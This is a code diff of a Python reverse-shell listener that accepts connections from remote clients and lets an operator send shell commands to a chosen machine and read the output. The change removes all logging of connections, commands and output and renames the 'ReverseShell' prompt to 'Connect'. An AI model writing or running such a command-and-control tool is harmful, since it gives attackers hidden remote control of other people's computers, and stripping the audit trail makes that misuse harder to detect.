@@ -1,8 +1,7 @@
-from os import mkdir, system, path
+from os import system
 import socket
 from threading import Thread
 from colorama import init, Fore, Style
-from datetime import date, datetime
 import platform
 
 SERVER_HOST = "0.0.0.0"
@@ -34,34 +33,21 @@ def start():
         client_socket, client_address = s.accept()
         Thread(target = add_client(client_socket, client_address)).start()
     
-def log_data(head, msg):
-    d = date.today()
-    t = datetime.now()
-    f = open('logs/{0}-{1}-{2}.log'.format(date.today().year, date.today().month, date.today().day), "a+")
-    f.write("[{0}] [{0}/{1}/{2}-{3}:{4}:{5}] {6}.\n".format(head, d.day, d.month, d.year, t.hour, t.minute, t.second, msg))
-    f.close
-
-def connect(function):
+def connect(socket):
     global in_menu
     try:
-        clients[function-1]["conn"].send("test".encode())
+        socket["conn"].send("test".encode())
         condition = True
     except:
         condition = False
     if condition:
-        log_data("CONNECTED", "Connected to {0} {1}.\n".format(clients[function-1]["user"], clients[function-1]["addr"]))
-        if not path.exists('logs'):
-            mkdir('logs')
-        if not path.exists('logs/{0}-{1}-{2}.log'.format(date.today().year, date.today().month, date.today().day)):
-            log_data("CONNECTED", "Connected to {0} {1}".format(clients[function-1]["user"], clients[function-1]["addr"]))
         in_menu = False
-        client_socket = clients[function-1]["conn"]
-        cwd = clients[function-1]["cwd"]
+        client_socket = socket["conn"]
+        cwd = socket["cwd"]
         system(clear)
         while True:
             try:
                 command = input(f"{cwd} #> ")
-                log_data("COMMAND", "[{0}] {1} {2}".format(clients[function-1]["user"], clients[function-1]["addr"], command))
                 if not command.strip():
                     continue
                 client_socket.send(command.encode())
@@ -74,18 +60,15 @@ def connect(function):
                     continue
                 client_socket.send(command.encode())
                 output = client_socket.recv(BUFFER_SIZE).decode()
-                print("output:", output)
+                print(output)
                 results, cwd = output.split(SEPARATOR)
-                log_data("OUTPUT", "[{0}] {1} {2}".format(clients[function-1]["user"], clients[function-1]["addr"], results))
                 print(results)
             except:
-                log_data("ERROR", "[{0}] {1} ¡Ha ocurrido un error!".format(clients[function-1]["user"], clients[function-1]["addr"]))
                 print("¡Ha ocurrido un error!")
                 break
         in_menu = True
         update_screen()
     else:
-        log_data("ERROR", "Failed Connection to [{0}] {1}".format(clients[function-1]["user"], clients[function-1]["addr"]))
         update_screen()
 
 def update_screen():
@@ -106,10 +89,8 @@ Thread(target = start).start()
 
 while True:
     update_screen()
-    function = input("\n  ReverseShell #> ")
-    log_data("ReverseShell", function)
-    if function.startswith("connect ") and function.split()[1]: 
-        try:
-            connect(int(function.split()[1]))
-        except:
-            False
+    function = input("\n  Connect #> ")
+    try:
+        connect(clients[int(function) - 1])
+    except:
+        False
